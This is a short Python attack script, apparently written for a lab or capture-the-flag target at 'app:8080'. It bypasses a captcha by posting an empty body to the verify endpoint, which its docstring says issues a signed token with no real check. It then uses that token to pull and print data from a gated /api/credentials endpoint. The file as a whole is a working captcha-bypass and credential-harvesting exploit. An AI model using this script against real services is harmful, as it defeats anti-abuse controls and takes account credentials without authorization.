#!/usr/bin/env python3
"""Solve the captcha (it's just a signed token, no slider check) and pull
credentials from the gated /api/credentials endpoint.
Usage: get_credentials.py <session_id>
"""
import sys
import urllib.request
import json

sid = sys.argv[1]

req = urllib.request.Request(
    "http://app:8080/api/captcha/verify",
    data=b"{}",
    headers={"Authorization": f"Bearer {sid}", "Content-Type": "application/json"},
    method="POST",
)
token = json.loads(urllib.request.urlopen(req).read())["token"]

req2 = urllib.request.Request(
    "http://app:8080/api/credentials",
    headers={"Authorization": f"Bearer {sid}", "X-Captcha-Token": token},
)
print(json.dumps(json.loads(urllib.request.urlopen(req2).read()), indent=2))
